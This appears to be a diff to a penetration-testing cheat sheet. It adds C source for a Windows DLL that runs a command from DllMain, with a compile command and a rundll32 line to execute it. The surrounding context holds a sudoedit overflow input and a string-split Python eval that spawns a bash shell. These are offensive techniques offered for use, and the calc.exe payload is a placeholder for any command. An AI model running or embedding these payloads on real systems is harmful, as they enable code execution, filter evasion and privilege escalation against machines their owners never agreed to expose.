@@ -1134,3 +1134,25 @@ sudoedit -s '\' `perl -e 'print "A" x 65536'`
 ```
 eval("__impo"+"rt__('o"+"s').system('bash')")
 ```
+
+[Generate dll that execute command]
+```
+#include <windows.h>
+int NotLahMal()
+{
+ WinExec("calc.exe", 0);
+ return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ NotLahMal();
+ return 0;
+}
+```
+
+>> Compile with cl.exe
+call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat" && cl /LD notamal.c
+
+>> dll can be executed with
+rundll32.exe shell32.dll,Control_RunDLL .\notamall.dll
